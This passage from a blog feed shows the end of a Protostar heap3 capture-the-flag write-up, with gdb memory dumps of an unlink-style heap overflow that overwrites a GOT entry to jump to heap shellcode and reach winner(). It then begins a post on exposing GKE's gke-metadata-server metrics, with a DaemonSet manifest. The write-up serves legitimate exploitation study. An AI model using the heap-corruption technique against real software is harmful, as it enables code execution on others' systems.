</span></code></pre></td></tr></table></div></figure>


<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c030</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x0804c014</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let the rest of the program run to see <code>winner()</code> is called.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x08048790</span> <span class="n">in</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x0804c014</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x0804c019</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="n">winner</span> <span class="p">()</span> <span class="n">at</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">8</span>
</span><span class='line'><span class="mi">8</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
</span><span class='line'>  <span class="n">in</span> <span class="n">heap3</span><span class="o">/</span><span class="n">heap3</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1587442625</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x048864b8</span>  <span class="mh">0x00d0ff08</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x0804c01b</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s run it without gdb.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="p">.</span><span class="o">/</span><span class="n">heap3</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
</span><span class='line'><span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1587443061</span>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>Amazing.</p>

<h3>References</h3>

<ul>
<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Expose a Localhost-only Endpoint on GKE]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-expose-a-localhost-only-endpoint-on-gke/"/>
    <updated>2020-04-13T12:24:46-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-expose-a-localhost-only-endpoint-on-gke</id>
    <content type="html"><![CDATA[<p>In my <a href="https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity/">previous post</a> I wrote about how to load test GKE Workload Identity. In this post I&rsquo;ll
describe how to get metrics from gke-metadata-server, the part of Workload Identity that runs on
your GKE clusters&#8217; nodes. This solution is a temporary workaround until GKE provides a better way to
get metrics on gke-metadata-server.</p>

<p>Gke-metadata-server runs as a K8s DaemonSet. It exposes metrics about itself in <a href="https://github.com/prometheus/docs/blob/master/content/docs/instrumenting/exposition_formats.md#text-based-format">Prometheus
text-based format</a>. I want to have an external scraper make HTTP requests to periodically collect
these metrics. Unfortunately, the Prometheus HTTP server only listens on the Container&rsquo;s <code>localhost</code>
interface. <strong>So how can we expose these metrics, i.e. make the HTTP endpoint available externally?</strong></p>

<h3>tl;dr lessons learned</h3>

<ul>
<li><code>socat</code> is awesome.</li>
<li>If something you need is running on a computer you control, you can always find a way extract info
from it if you&rsquo;re resourceful enough.</li>
</ul>


<!-- more -->


<h2>My specific GKE cluster configuration</h2>

<ul>
<li>GKE masters and nodes running version 1.15.9-gke.22</li>
<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
<li>6 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
<li>each node is configured to have a maximum of 32 Pods</li>
<li>cluster and node pool have WI enabled</li>
</ul>


<p>Notice the DaemonSet is configured with <code>.spec.template.spec.hostNetwork: true</code> below. This means
the HTTP server is also listening on the GKE node&rsquo;s <code>localhost</code> interface.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">extensions/v1beta1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">DaemonSet</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">addonmanager.kubernetes.io/mode</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Reconcile</span>
</span><span class='line'>    <span class="l-Scalar-Plain">k8s-app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kube-system</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">revisionHistoryLimit</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">k8s-app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">annotations</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">components.gke.io/component-name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>        <span class="l-Scalar-Plain">components.gke.io/component-version</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">0.2.21</span>
</span><span class='line'>        <span class="l-Scalar-Plain">scheduler.alpha.kubernetes.io/critical-pod</span><span class="p-Indicator">:</span> <span class="s">&#39;&quot;</span><span class="se">&#39;&#39;</span><span class="s">&quot;&#39;</span>
</span><span class='line'>      <span class="l-Scalar-Plain">creationTimestamp</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">null</span>
